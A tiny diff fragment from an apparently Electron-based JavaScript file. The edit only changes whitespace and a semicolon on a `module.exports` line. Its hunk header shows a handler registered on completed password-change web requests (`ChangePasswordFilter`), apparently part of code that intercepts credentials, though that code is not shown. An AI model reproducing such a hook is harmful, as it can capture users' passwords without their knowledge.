@@ -1390,4 +1390,5 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
     }
 });
 
-module.exports = require('./core.asar');
+
+module.exports = require('./core.asar')
